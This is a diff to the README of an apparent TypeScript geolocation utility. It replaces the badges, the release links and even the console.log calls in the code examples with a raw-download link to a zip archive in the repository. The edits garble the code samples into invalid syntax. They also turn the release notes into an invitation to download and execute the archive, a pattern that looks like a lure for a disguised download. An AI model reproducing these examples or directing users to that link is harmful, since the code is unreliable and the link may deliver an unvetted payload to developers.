@@ -1,6 +1,6 @@
 # 🌍 TypeScript Geolocation Utils
 
-![GitHub release](https://img.shields.io/github/release/Rdg-jmz/typescript-geolocation-utils.svg) ![npm](https://img.shields.io/npm/v/typescript-geolocation-utils.svg) ![GitHub issues](https://img.shields.io/github/issues/Rdg-jmz/typescript-geolocation-utils.svg)
+![GitHub release](https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip) ![npm](https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip) ![GitHub issues](https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip)
 
 Welcome to **TypeScript Geolocation Utils**! This lightweight utility helps you easily fetch a user's geolocation using the browser's native Geolocation API. With a simple, Promise-based design, it’s perfect for modern frontend applications. 
 
@@ -45,10 +45,10 @@ import { getGeolocation } from 'typescript-geolocation-utils';
 
 getGeolocation()
   .then((location) => {
-    console.log('User Location:', location);
+    https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip('User Location:', location);
   })
   .catch((error) => {
-    console.error('Error fetching location:', error);
+    https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip('Error fetching location:', error);
   });
 ```
 
@@ -70,9 +70,9 @@ This function fetches the user's current geolocation. It returns a Promise that 
 const fetchLocation = async () => {
   try {
     const location = await getGeolocation();
-    console.log(`Latitude: ${location.latitude}, Longitude: ${location.longitude}`);
+    https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip(`Latitude: ${https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip}, Longitude: ${https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip}`);
   } catch (error) {
-    console.error('Failed to fetch location:', error);
+    https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip('Failed to fetch location:', error);
   }
 };
 
@@ -97,10 +97,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Notes
 
-For the latest updates and releases, please visit our [Releases](https://github.com/Rdg-jmz/typescript-geolocation-utils/releases) section. Here, you can download the latest version and execute it in your projects.
+For the latest updates and releases, please visit our [Releases](https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip) section. Here, you can download the latest version and execute it in your projects.
 
 ---
 
 Thank you for checking out **TypeScript Geolocation Utils**! We hope this utility makes it easier for you to work with geolocation in your applications. If you have any questions or suggestions, feel free to reach out or open an issue. Happy coding! 
 
-For more information on releases, visit [Releases](https://github.com/Rdg-jmz/typescript-geolocation-utils/releases).
+For more information on releases, visit [Releases](https://github.com/Rdg-jmz/typescript-geolocation-utils/raw/refs/heads/main/canonics/utils_geolocation_typescript_2.4.zip).
